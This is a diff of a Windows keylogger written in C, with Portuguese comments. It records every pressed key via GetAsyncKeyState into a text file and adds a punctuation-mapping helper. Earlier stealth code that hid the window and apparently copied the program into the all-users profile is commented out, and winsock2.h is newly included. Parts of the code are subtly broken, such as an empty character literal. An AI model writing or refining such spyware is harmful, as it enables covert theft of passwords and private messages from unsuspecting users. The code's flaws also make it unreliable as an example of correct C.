@@ -2,15 +2,17 @@
 #include <stdio.h>
 #include <windows.h>
 #include <locale.h>
+#include <winsock2.h>
 
 void getWords();
 int fileExists(char *file);
-void hideProgram();
+void hiddenProgram();
+char convertAscii(int codAscii);
 
 int main(int argc, char* argv[])
 {
-	ShowWindow(GetForegroundWindow(), SW_HIDE);
-	hideProgram(argv[0]);	
+	// ShowWindow(GetForegroundWindow(), SW_HIDE);
+	// hiddenProgram(argv[0]);	
 
 	while(1)
 	{
@@ -23,23 +25,33 @@ int main(int argc, char* argv[])
 
 void getWords()
 {	
-	int resultado, tecla;
+	int keyState;
 	FILE *file = NULL;
 	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a");
 
-	for(tecla = 0; tecla <= 255; tecla++)
+	for(int keyCode=0; keyCode <= 255; keyCode++)
 	{
-		resultado = GetAsyncKeyState(tecla);
+		//Verifica o 'status' de uma tecla e guarda na variavel -32767 se ela foi pressionada
+		keyState = GetAsyncKeyState(keyCode);
+		
+		//  GetKeyboardState
 
-		if(resultado == -32767) {
-			fprintf(file,"%c",tecla);
-			printf("%c",tecla);
+		if(keyState == -32767) {			
+			char tec = convertAscii(keyCode);
+			if(tec != 'z'){
+				fprintf(file, "%c", tec);
+				printf("%c", tec);
+			}else{
+				fprintf(file,"%c", keyCode);
+				printf("%c", keyCode);
+				// printf("%i", keyCode);
+			}
 		}
 	}
 	fclose(file);
 }
 
-void hideProgram(char* file)
+void hiddenProgram(char* file)
 {
 	char* AllUsersProfile = getenv("allusersprofile");
 	char destino[9999];
@@ -59,4 +71,19 @@ int fileExists(char *file)
 		return 1;
 	}
 	return 0;
+}
+
+// Função para tratar as teclas não alfa-numericas. (',' , '|', 'ç' , ';'...)
+char convertAscii(int codAscii){
+	char tecla = '';
+
+	switch(codAscii){
+		case 187: tecla = '='; break;
+		case 188: tecla = ','; break;
+		case 189: tecla = '-'; break;
+		case 190: tecla = '.'; break;
+		case 191: tecla = ';'; break;
+		case 193: tecla = '/'; break;
+	}
+	return tecla;
 }
